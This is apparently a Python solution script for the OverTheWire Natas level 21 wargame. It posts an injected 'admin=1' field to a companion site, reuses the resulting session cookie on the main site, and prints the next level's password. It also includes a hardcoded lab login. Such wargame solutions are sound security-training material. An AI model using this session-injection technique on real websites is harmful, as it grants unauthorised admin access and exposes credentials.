
import requests

auth = ('natas21', 'IFekPyrQXftziDEsUr3x21sYuahypdgJ')

data = {"submit": "", "color": "green", "admin": "1"}

s = requests.Session()
s.auth = auth
req = s.post("http://natas21-experimenter.natas.labs.overthewire.org/index.php",
             data=data)
session_ID = req.cookies.get_dict()
print(session_ID)

req = s.get("http://natas21.natas.labs.overthewire.org/index.php",
            cookies=session_ID)

results = req.text.split()
print(results[results.index("Password:") + 1])
